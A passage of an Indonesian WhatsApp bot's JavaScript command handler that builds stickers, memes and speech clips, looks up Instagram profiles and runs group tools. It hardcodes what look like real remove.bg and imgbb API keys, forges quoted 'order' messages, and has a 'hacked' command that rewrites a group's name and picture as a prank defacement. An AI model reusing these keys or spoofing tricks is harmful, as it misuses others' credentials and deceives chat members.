					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					const simpel = `\`\`\`┌─❏「 ${pushname} 」\`\`\`
\`\`\`│◪ ${prefix}sticker\`\`\`
\`\`\`│◪ ${prefix}stickergif\`\`\`
\`\`\`│◪ ${prefix}stickwm\`\`\`
\`\`\`│◪ ${prefix}sticknobg\`\`\`
\`\`\`│◪ ${prefix}takestick\`\`\`
\`\`\`│◪ ${prefix}smeme\`\`\`
\`\`\`│◪ ${prefix}fdeface\`\`\`
\`\`\`│◪ ${prefix}nuliskiri\`\`\`
\`\`\`│◪ ${prefix}nuliskanan\`\`\`
\`\`\`│◪ ${prefix}igstalk\`\`\`
\`\`\`│◪ ${prefix}lirik\`\`\`
\`\`\`│◪ ${prefix}mimpi\`\`\`
\`\`\`│◪ ${prefix}jadwaltv\`\`\`
\`\`\`│◪ ${prefix}tts\`\`\`
\`\`\`│◪ ${prefix}ttp\`\`\`
\`\`\`│◪ ${prefix}attp\`\`\`
\`\`\`│◪ ${prefix}emoji\`\`\`
\`\`\`│◪ ${prefix}simi\`\`\`
\`\`\`│◪ ${prefix}quotes\`\`\`
\`\`\`│◪ ${prefix}bikinquote\`\`\`
\`\`\`└─❏「 ${pushname} 」\`\`\``
					dila.sendMessage(from, simpel, text, { thumbnail: dnsnew, sendEphemeral: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 999, status: 200, thumbnail: fs.readFileSync('./src/image/thumbnail.jpeg'), surface: 200, message: 'Simple Menu', orderTitle: 'Simple Menu', sellerJid: '0@s.whatsapp.net'}}}})
					break
					case 'sticknobg':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
									if (!isQuotedSticker) return reply('stickernya mana anjeng')
					if (isQuotedSticker) {
												 if (Lan.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated) return reply('Reply gambarnya!')
ger = JSON.parse(JSON.stringify(Lan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
ran = getRandom('.png')
ehgmediabi = await dila.downloadAndSaveMediaMessage(ger)
exec(`ffmpeg -i ${ehgmediabi} ${ran}`, (err) => {
	fs.writeFileSync('sticknobg.png', fs.readFileSync(ran))
						if (err) return reply('Error om')
							ranp = getRandom('.png')
					keyrmbg = '5LXrQ1MAYDnE1iib6B6NaHMv'
							removeBackgroundFromImageFile({path: 'sticknobg.png', apiKey: keyrmbg, size: 'auto', type: 'auto', ranp})
							.then(res => {
								let buffur = Buffer.from(res.base64img, 'base64')
								fs.writeFileSync(ranp, buffur)
								var imgbb = require('imgbb-uploader')
								imgbb("68cb5bee517bce4f74b0e910a5d96346", ranp)
								.then(anu => {
								sendStickerUrl(from, anu.display_url)
								})
							})
					})
					} else {
						reply('Stickernya?')
					}
									break
					case 'smeme':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
									 var tex1 = body.slice(7).split('|')[0]
var tex2 = body.slice(7).split('|')[1]
if (Lan.message.extendedTextMessage != undefined || Lan.message.extendedTextMessage != null) {
                                          ger = JSON.parse(JSON.stringify(Lan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
                                        owgi = await dila.downloadAndSaveMediaMessage(ger)
					 var uploade = await uploadimg(owgi, Date.now() + '.webp')
                                        teks = `${uploade.result.image}`
										buffer = `https://api-self.herokuapp.com/api/memegen2?teks1=${tex1}&teks2=${tex2}&img_url=${teks}`
										sendStickerUrl(from, buffer)
									 }
									break
					case 'emoji':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
		   if (args === 0) return reply('emojinya?')   
		   aku4 = args.join(' ')
           emoji.get(`${aku4}`).then(emoji => {
           link = `${emoji.images[4].url}`
		   sendWebp(from, `${link}`).catch(() => reply('gagal'))
           })
    	   break
					case 'swm':
					case 'stikerwm':
					case 'stickerwm':
					case 'stickwm':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
		    var Exif = require(process.cwd() + '/exif.js')
            var exif = new Exif()
            var stickerWm = (media, packname, author) => {
            ran = getRandom('.webp')
            exif.create(packname, author, from.split("@")[0])
            exec(`webpmux -set exif ./temp/${from.split("@")[0]}.exif ./${media} -o ./${ran}`, (err, stderr, stdout) => {
            if (err) return dila.sendMessage(from, String(err), text, { quoted: Lan})
            dila.sendMessage(from, fs.readFileSync(ran), sticker, { quoted: Lan})
        })
    }
    if ((isMedia && !isQuotedVideo || isQuotedImage) && args.length >= 0) {
               var mediaEncrypt = isQuotedImage ? JSON.parse(JSON.stringify(Lan).replace('quotedM','m')).message.extendedTextMessage.contextInfo : Lan
               var mediaFinalys = await dila.downloadAndSaveMediaMessage(mediaEncrypt, 'dlstikerwm')
               var kls = body.slice(5)
			   var has = kls.split("|")[0];
			   var kas = kls.split("|")[1];
               var packageName = `${has}`
               var packageAuthor = `${kas}`
               var exifName = 'stikerwm.exif',
                   webpName = `${from.split(/@/)[0]}.webp`
               try {
                   exec(`cwebp -q 50 dlstikerwm.jpeg -o ${webpName}`, (e, stderr, stdout) => {
                       if (e) return reply(from, String(stderr))
                           stickerWm(webpName, packageName, packageAuthor)
                   })
               } catch (e) {
                   throw e
               }
           }
                break
					case 'takestick':
					case 'takesticker':
					case 'takestiker':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isQuotedSticker) return reply(`Reply sticker dengan caption *${prefix}takestick nama|author*`)
              encmedia = JSON.parse(JSON.stringify(Lan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
			  media = await dila.downloadAndSaveMediaMessage(encmedia)
              anu = args.join(' ').split('|')
              var kls = body.slice(11)
			  var has = kls.split("|")[0];
		      var kas = kls.split("|")[1];
              satu = anu[0] !== `${pushname}` ? anu[0] : `${has}`
              dua = typeof anu[1] !== `${pushname}` ? anu[1] : `${kas}`
              require('./lib/exif.js').createExif(satu, dua)
			  require('./lib/exif.js').modStick(media, dila, Lan, from)
				break
				case 'sticker':
				case 'stiker':
				case 'stickergif':
				case 'stikergif':
				case 'sgif':
				case 's':
				if (isBanned) return reply(dla.baned())
					if ((isMedia && !Lan.message.videoMessage || isQuotedImage) && args.length == 0) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(Lan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Lan
						const media = await dila.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.webp')
						await ffmpeg(`./${media}`)
							.input(media)
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								costum('[❗] SEDANG DIPROSES', text, tescuk, cr)
							})
							.on('end', function () {
								console.log('Finish')
								dila.sendMessage(from, fs.readFileSync(ran), sticker, { quoted: Lan})
								fs.unlinkSync(media)
								fs.unlinkSync(ran)
							})
							.addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)
					} else if ((isMedia && Lan.message.videoMessage.seconds < 11 || isQuotedVideo && Lan.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(Lan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Lan
						const media = await dila.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.webp')
						costum('[❗] SEDANG DIPROSES', text, tescuk, cr)
						await ffmpeg(`./${media}`)
							.inputFormat(media.split('.')[1])
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								tipe = media.endsWith('.mp4') ? 'video' : 'gif'
								reply(`Gagal, pada saat mengkonversi ${tipe} ke stiker`)
							})
							.on('end', function () {
								console.log('Finish')

								dila.sendMessage(from, fs.readFileSync(ran), sticker, { quoted: Lan})
								fs.unlinkSync(media)
								fs.unlinkSync(ran)
							})
							.addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)
					} else {
						reply(`Kirim gambar dengan caption ${prefix}sticker\nDurasi Sticker Video 1-9 Detik`)
					}
					break
					case 'nuliskiri':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teksnya mana kak? Contoh : ${prefix}nuliskiri Dns Bot`)
					reply('「❗」WAIT BRO GUE NULIS DUMLU YAKAN')
					kir = await getBuffer(`https://api.xteam.xyz/magernulis2?text=${q}&APIKEY=${xteam}`)
					dila.sendMessage(from, kir, image, { quoted: Lan, caption: 'Nihh kak' })
					break
				case 'nuliskanan':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teksnya mana kak? Contoh : ${prefix}nuliskanan Dns Bot`)
					reply('「❗」WAIT BRO GUE NULIS DUMLU YAKAN')
					kan = await getBuffer(`https://api.xteam.xyz/magernulis3?text=${q}&APIKEY=${xteam}`)
					dila.sendMessage(from, kan, image, { quoted: Lan, caption: 'Nihh kak' })
					break
case 'igstalk':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.imitend(pusname, prefix))
					await limitAdd(sender)
            if (!q) return reply(`Masukan username!\nContoh :\n${prefix}igstalk denssptraa_`)
					anu = await fetchJson(`https://api.xteam.xyz/dl/igstalk?nama=${q}&APIKEY=${xteam}`)
					reply (dla.wait())
					stig = await getBuffer(anu.result.user.hd_profile_pic_url_info.url)
					abu = anu.result.user
					hasil = `「 *IG-STALK* 」

❏ *Nama* : ${abu.full_name}
❏ *Followers* : ${abu.follower_count}
❏ *Following* : ${abu.following_count}
❏ *Jumlah Post* : ${abu.media_count}
❏ *Biografi* : ${abu.biography}`
					dila.sendMessage(from, stig, image, { quoted: Lan, caption: hasil })
					break
				case 'tts':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return dila.sendMessage(from, `Kode bahasanya mana kak? contoh : ${prefix}tts id yamate kudasai`, text, { quoted: Lan })
				   const gtts = require('./lib/gtts')(args[0])
					if (args.length < 2) return dila.sendMessage(from, `Teksnya mana kak | contoh : ${prefix}tts id ah yamate kudasai`, text, { quoted: Lan })
					var bby = body.slice(8)
					ranm = getRandom('.mp3')
					rano = getRandom('.ogg')
					bby.length > 300
						? reply('Teks nya terlalu panjang kak')
						: gtts.save(ranm, bby, function () {
							exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
								fs.unlinkSync(ranm)
								buff = fs.readFileSync(rano)
								if (err) return reply(dla.stikga())
								dila.sendMessage(from, buff, audio, { duration: 999999999, ptt: true, quoted: Lan })
								fs.unlinkSync(rano)
							})
						})
					break

				case 'ttp':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}ttp BOT`)
					pngttp = './temp/ttp.png'
					webpng = './temp/ttp.webp'
					fetch(`https://api.areltiyan.site/sticker_maker?text=${q}`, { method: 'GET' })
						.then(async res => {
							const ttptxt = await res.json()
							console.log("BERHASIL")
							base64Img.img(ttptxt.base64, 'temp', 'ttp', function (err, filepath) {
								if (err) return console.log(err);
								exec(`ffmpeg -i ${pngttp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${webpng}`, (err) => {
									buffer = fs.readFileSync(webpng)
									dila.sendMessage(from, buffer, sticker,{quoted:Lan})
									fs.unlinkSync(webpng)
									fs.unlinkSync(pngttp)
								})
							})
						});
					break
				case 'attp':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}attp BOT`)
					atetepe = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURIComponent(q)}`)
					dila.sendMessage(from, atetepe, sticker, { quoted: Lan })
					break

				case 'simi':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isPrem) return reply(dla.premium(prefix))
					if (!q) return reply(`Mau Ngapain?\nContoh :\n${prefix}simi halo`)
					anu = await fetchJson(`https://api.xteam.xyz/simsimi?kata=halo&APIKEY=${xteam}`)
					reply(anu.jawaban)
					break

				case 'quotes':
					dila.updatePresence(from, Presence.composing)
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					data = fs.readFileSync('./dns/quote.json');
					jsonData = JSON.parse(data);
					randIndex = Math.floor(Math.random() * jsonData.length);
					randKey = jsonData[randIndex];
					randQuote = '' + randKey.quote + '\n\n_By: ' + randKey.by + '_'
					fakestatus(randQuote)
					break

				case 'bikinquote':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					var gh = body.slice(12)
					var quote = gh.split("&")[0];
					var wm = gh.split("&")[1];
					const pref = `yang mau dijadiin quote apaan, titit?\ncontoh :\n${prefix}bikinquote aku bukan boneka & Kata Ilham`
					if (args.length < 1) return reply(pref)
					reply(dla.wait())
					anu = await fetchJson(`https://terhambar.com/aw/qts/?kata=${quote}&author=${wm}&tipe=random`, { method: 'get' })
					biquote = await getBuffer(anu.result)
					dila.sendMessage(from, biquote, image, { caption: 'Nih kak >_<', quoted: Lan })
					break
				case 'groupmenu':
				case 'grupmenu':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					const menugrup = `\`\`\`┌─❏「 ${pushname} 」\`\`\`
\`\`\`│◪ ${prefix}welcome\`\`\`
\`\`\`│◪ ${prefix}leveling\`\`\`
\`\`\`│◪ ${prefix}antilink\`\`\`
\`\`\`│◪ ${prefix}antibadword\`\`\`
\`\`\`│◪ ${prefix}antibule\`\`\`
\`\`\`│◪ ${prefix}getpict\`\`\`
\`\`\`│◪ ${prefix}getbio\`\`\`
\`\`\`│◪ ${prefix}getppgc\`\`\`
\`\`\`│◪ ${prefix}getdeskgc\`\`\`
\`\`\`│◪ ${prefix}group\`\`\`
\`\`\`│◪ ${prefix}admin\`\`\`
\`\`\`│◪ ${prefix}kontak\`\`\`
\`\`\`│◪ ${prefix}autosticker\`\`\`
\`\`\`│◪ ${prefix}kontag\`\`\`
\`\`\`│◪ ${prefix}totag\`\`\`
\`\`\`│◪ ${prefix}sticktag\`\`\`
\`\`\`│◪ ${prefix}imgtag\`\`\`
\`\`\`│◪ ${prefix}ephemeral\`\`\`
\`\`\`│◪ ${prefix}creategroup\`\`\`
\`\`\`│◪ ${prefix}add\`\`\`
\`\`\`│◪ ${prefix}kick\`\`\`
\`\`\`│◪ ${prefix}afk\`\`\`
\`\`\`│◪ ${prefix}hidetag\`\`\`
\`\`\`│◪ ${prefix}level\`\`\`
\`\`\`│◪ ${prefix}hacked\`\`\`
\`\`\`│◪ ${prefix}linkgroup\`\`\`
\`\`\`│◪ ${prefix}antidelete\`\`\`
\`\`\`│◪ ${prefix}tagall\`\`\`
\`\`\`│◪ ${prefix}simih\`\`\`
\`\`\`│◪ ${prefix}setname\`\`\`
\`\`\`│◪ ${prefix}setdesc\`\`\`
\`\`\`│◪ ${prefix}demote\`\`\`
\`\`\`│◪ ${prefix}promote\`\`\`
\`\`\`│◪ ${prefix}fitnah\`\`\`
\`\`\`│◪ ${prefix}jadian\`\`\`
\`\`\`│◪ ${prefix}delete\`\`\`
\`\`\`│◪ ${prefix}mining\`\`\`
\`\`\`└─❏「 ${pushname} 」\`\`\``
					dila.sendMessage(from, menugrup, text, { thumbnail: dnsnew, sendEphemeral: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 999, status: 200, thumbnail: fs.readFileSync('./src/image/thumbnail.jpeg'), surface: 200, message: 'Group Menu', orderTitle: 'Group Menu', sellerJid: '0@s.whatsapp.net'}}}})
					break
					case 'getdeskgc':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isGroup) return reply(dla.groupo())
			   anu = from
			   metadete = await dila.groupMetadata(anu)
				dila.sendMessage(from, metadete.desc, text, {quoted:Lan})
				  break
					case 'getppgc':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isGroup) return reply(dla.groupo())
				anu = from
		if (`${anu}@g.us`) {
		try {
					ppimg = await dila.getProfilePicture(anu)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				metadete = await dila.groupMetadata(anu)
				ano = await dila.getProfilePicture(anu)
				buffer = await getBuffer(ano)
				dila.sendMessage(from, buffer, image, {quoted: Lan})
		} else {
		}
			  break
					case 'ephemeral':    
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isGroup) return reply(dla.groupo())
					if (!isGroupAdmins) return reply(dla.admin())
                ppgc = await dila.getProfilePicture(from)
                teks = args.join(' ')
                sksks = body.slice(11)
                group = await dila.groupMetadata(from);
                member = group['participants']
                jids = [];
                member.map( async adm => {
                jids.push(adm.id.replace('c.us', 's.whatsapp.net'));
                 })
                 options = {
                contextInfo: {mentionedJid: groupMembers.map(v => v.jid)},
               sendEphemeral: true, 
               thumbnail: await imageToBase64(ppgc)
                }
              await dila.sendMessage(from, `${sksks}`, text, options, { contextInfo: { forwardingScore: 508, isForwarded: true}})
               break
               case 'hacked':
               if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isGroup) return reply(dla.groupo())
					if (!isGroupAdmins) return reply(dla.admin())
					if (!isBotGroupAdmins) return reply(dla.badmin())
               reply(dla.wait())
                tessgc = await getBuffer(`https://i.ibb.co/m4Qx3JG/20210319-204838.jpg`)
                   dila.updateProfilePicture (from, tessgc)
                   await sleep(1000)
                dila.groupUpdateSubject(from, `Hacked By ${body.slice(8)}`)
                await sleep(1000)
                dila.groupUpdateDescription(from, `*_Hacked By ${pushname}_*`)             
                await sleep(1000)
                dila.sendMessage(from, `Sukses Hack Grup ${groupMetadata.subject}`, text, {quoted: Lan})
					break  
				case 'sticktag':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isGroup) return reply(dla.groupo())
					if (!isGroupAdmins) return reply(dla.admin())
                                        if (!isQuotedSticker) return reply('Reply stickernya!')
                                        boij = JSON.parse(JSON.stringify(Lan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
                                        delb = await dila.downloadMediaMessage(boij)
                                        await fs.writeFileSync(`stctagg.webp`, delb)
                                        var group = await dila.groupMetadata(from)
                                        var member = group['participants']
                                        var mem = []
                                        member.map(async adm => {
                                                mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
                                        })
					var itsme = `0@s.whatsapp.net`
					var split = `Sticker Tag`
					var selepbot = {
						contextInfo: {
							mentionedJid: mem,
                                                        participant: itsme,                                                                                                                          quotedMessage: {
                                                                extendedTextMessage: {
                                                                text: split,
							   }
					      	      }
					       }
					}
					result = fs.readFileSync(`stctagg.webp`)
                                        dila.sendMessage(from, result, sticker, selepbot)
					await fs.unlinkSync(`stctagg.webp`)
					break
					case 'imgtag':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isGroup) return reply(dla.groupo())
					if (!isGroupAdmins) return reply(dla.admin())
                    if ((isMedia && !Lan.message.videoMessage || isQuotedImage) && args.length == 0) {
                        const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(Lan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Lan
                        filePath = await dila.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
                        var value = args.join(" ")
                        var group = await dila.groupMetadata(from)
                        var member = group['participants']
                        var mem = []
                        member.map(async adm => {
                            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
                        })
                        var options = { contextInfo: { mentionedJid: mem },
                            quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "Image Tag", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486"} } }
                        }
                        ini_buffer = fs.readFileSync(filePath)
                        dila.sendMessage(from, ini_buffer, image, options)
                        fs.unlinkSync(filePath)
                    } else {
                        reply(`Reply imagenya!`)
                    }
                    break
					case 'autosticker':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isGroup) return reply(dla.groupo())
					if (!isGroupAdmins) return reply(dla.admin())
					if (args.length < 1) return reply(`Penggunaan:\n\n${prefix}autosticker 1\natau\n${prefix}autosticker 0`)
					if (Number(args[0]) === 1) {
						if (isAuto) return reply('Udah aktif um')
						autosticker.push(from)
						fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
						reply(`Sukses mengaktifkan fitur autosticker di group *${groupMetadata.subject}*`)
					} else if (Number(args[0]) === 0) {
						autosticker.splice(from)
						fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
						reply(`Sukses menonaktifkan fitur autosticker di group *${groupMetadata.subject}*`)
					} else {
						reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
					}
                                      break
					case 'getbio':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isGroup) return reply(dla.groupo())
					if (args.length < 1) return reply('Tag orangnya!')
                    mentioned = Lan.message.extendedTextMessage.contextInfo.mentionedJid[0]
                    const p = await dila.getStatus(`${mentioned}`, MessageType.text)
                    reply(p.status)
                    if (p.status == 401) {
                    reply("Error! mungkin diprivate")
                    }
                     break
                   case 'kontak':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isGroup) return reply(dla.groupo())
					argzu = arg.split('|')
				if (!argzu) return reply(`Penggunaan ${prefix}kontak @tag atau nomor|nama`)
				if (Lan.message.extendedTextMessage != undefined){
                    mentioned = Lan.message.extendedTextMessage.contextInfo.mentionedJid
					sendKontak(from, mentioned[0].split('@')[0], argzu[1])
				} else {
					sendKontak(from, argzu[0], argzu[1])
				}
				break
				case 'kontag':
				if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isGroup) return reply(dla.groupo())
					if (!isGroupAdmins) return reply(dla.admin())
				argzi = arg.split('|')
				if (!argzi) return reply(`Penggunaan ${prefix}kontak @tag atau nomor|nama`)
				if (Lan.message.extendedTextMessage != undefined){
                    		mentioned = Lan.message.extendedTextMessage.contextInfo.mentionedJid
					hideTagKontak(from, mentioned[0].split('@')[0], argzi[1])
				} else {
					hideTagKontak(from, argzi[0], argzi[1])
				}
				break
				case 'totag':
				if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isGroup) return reply(dla.groupo())
					if (!isGroupAdmins) return reply(dla.admin())
            if ((isMedia && !Lan.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(Lan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Lan
            file = await dila.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await dila.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: Lan
            }
            ini_buffer = fs.readFileSync(file)
            dila.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !Lan.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(Lan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Lan
            file = await dila.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await dila.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: Lan
            }
            ini_buffer = fs.readFileSync(file)
            dila.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !Lan.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(Lan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Lan
            file = await dila.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await dila.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'audio/mp4', duration: 999999999,
                ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: Lan
            }
            ini_buffer = fs.readFileSync(file)
            dila.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !Lan.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(Lan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Lan
            file = await dila.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await dila.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'video/mp4', duration: 999999999,
                contextInfo: { mentionedJid: mem },
                quoted: Lan
            }
            ini_buffer = fs.readFileSync(file)
            dila.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
          reply(`reply gambar/sticker/audio/video dengan caption ${prefix}totag`)
        }
        break
					case 'creategroup':
			case 'creategrup':
			if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isGroup) return reply(dla.groupo())
				if (args.length < 1) return reply(`Penggunaan ${prefix}creategrup nama grup|@tag member`)
				argza = arg.split('|')
				if (Lan.message.extendedTextMessage != undefined){
                    mentioned = Lan.message.extendedTextMessage.contextInfo.mentionedJid
                    for (let i = 0; i < mentioned.length; i++){
						anu = []
						anu.push(mentioned[i])
                    }
					dila.groupCreate(argza[0], anu)
					reply(`Sukes membuat grup:\n${argza}`)
                }
				break
					case 'getpict':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isGroup) return reply(dla.groupo())
            mentioned = Lan.message.extendedTextMessage.contextInfo.mentionedJid[0]
            pictt = await dila.getProfilePicture(mentioned)
            pict = await getBuffer(pictt)
            dila.sendMessage(from, pict, image, {quoted: Lan})
            break
                    case 'simih':
                    if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isGroup) return reply(dla.groupo())
					if (!isGroupAdmins) return reply(dla.admin())
					if (args.length < 1) return reply(`usage:\n\n${prefix}simih on\n${prefix}simih off`)
					if ((args[0]) === 'on') {
						if (isSimi) return reply('Mode simi sudah aktif')
						_samih.push(from)
						fs.writeFileSync('./database/simi.json', JSON.stringify(_samih))
						reply(`Sukses mengaktifkan mode simi di group *${groupMetadata.subject}*`)
					} else if ((args[0]) === 'off') {
						if (!isSimi) return reply('Mode simi Sudah Off sebelumnya')
						_samih.splice(from, 1)
						fs.writeFileSync('./database/simi.json', JSON.stringify(_samih))
						reply(`Sukes menonaktifkan mode simi di group *${groupMetadata.subject}*`)
					} else {
						reply('On untuk mengaktifkan, Off untuk menonaktifkan')
					}
					break
				case 'antibadword':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isGroup) return reply(dla.groupo())
					if (!isGroupAdmins) return reply(dla.admin())
